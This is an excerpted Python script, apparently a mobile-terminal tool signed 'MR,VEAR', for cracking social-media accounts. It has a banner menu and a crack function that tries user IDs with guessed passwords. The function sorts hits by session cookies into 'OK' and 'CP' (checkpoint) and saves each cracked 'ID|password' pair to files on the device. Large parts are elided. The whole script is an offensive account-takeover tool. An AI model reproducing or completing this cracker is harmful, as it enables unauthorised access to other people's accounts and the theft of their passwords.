...
def DUMPING():
	os.system('clear')
	banner()
	print('            \x1b[38;5;200mCreator \x1b[38;5;201m: \x1b[38;5;202mMR,VEAR ')
	print('            \x1b[38;5;200mUsername \x1b[38;5;201m: \x1b[38;5;202m@vear550 ')
	print('            \x1b[38;5;200mGithub \x1b[38;5;201m: \x1b[38;5;202m@NOT ')
	print('')
	print('        \x1b[38;5;210m[ 1 ] Craete File \033[1;37m[ MR,VEAR ] ')
	print('')
	print('        \x1b[38;5;211m[ 2 ] Craete File \033[1;37m[ MR,VEAR ] ')
	print('')
...
def menu():
	...
	print('            \x1b[38;5;200mCreator \x1b[38;5;201m: \x1b[38;5;202mMR,VEAR ')
	print('            \x1b[38;5;200mUsername \x1b[38;5;201m: \x1b[38;5;202m@vear550 ')
	print('            \x1b[38;5;200mGithub \x1b[38;5;201m: \x1b[38;5;202mNOT ')
	print('')
...
def crack(idf,pwv):
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \033[1;37mMR,VEAR-CP : \033[1;93m{idf} | {pw} ')
				print('')
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='MR,VEAR OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MR,VEAR OK[/bold green]'))
					ok+=1
					break
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='MR,VEAR CP'))
					open('/sdcard/MR,VEAR-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
